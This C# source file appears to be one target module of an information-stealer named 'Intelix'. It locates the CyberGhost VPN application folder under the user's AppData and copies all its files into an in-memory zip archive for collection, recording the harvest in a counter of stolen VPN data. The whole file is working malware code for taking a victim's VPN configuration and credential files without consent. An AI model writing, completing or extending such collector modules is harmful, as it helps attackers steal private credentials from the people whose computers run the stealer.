using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class CyberGhost : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CyberGhost");
		if (Directory.Exists(text))
		{
			string text2 = "CyberGhost";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "CyberGhost";
			zip.AddDirectoryFiles(text, text2);
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Vpns.Add(counterApplications);
		}
	}
}
